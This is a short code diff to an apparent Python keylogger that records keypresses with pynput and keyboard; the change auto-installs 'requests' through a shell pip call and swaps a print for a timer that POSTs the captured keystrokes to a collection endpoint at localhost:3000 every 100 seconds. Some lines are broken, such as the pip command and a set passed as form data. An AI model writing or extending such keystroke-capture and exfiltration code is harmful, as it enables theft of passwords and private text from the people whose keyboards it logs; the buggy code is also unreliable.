@@ -9,11 +9,13 @@ if sys.version_info.major >= 3:
         import socket
         import platform
         import threading
+        import json
+        import requests
         data = ''
 
 
     except ModuleNotFoundError:
-        packages = ["keyboard","pynput"]
+        packages = ["keyboard","pynput", "json", "requests"]
         for package in packages:
             subprocess.call("python3 -m pip install -r" + ' '.join(package), shell=True)
 
@@ -35,8 +37,11 @@ if sys.version_info.major >= 3:
             }
         def return_data():
             send_data_interval = threading.Timer(100, return_data)
-            print(data)
             send_data_interval.start()
+            global data
+            r = requests.post('http://localhost:3000/data', data={data})
+
+
                
         def on_press(key):
             global data
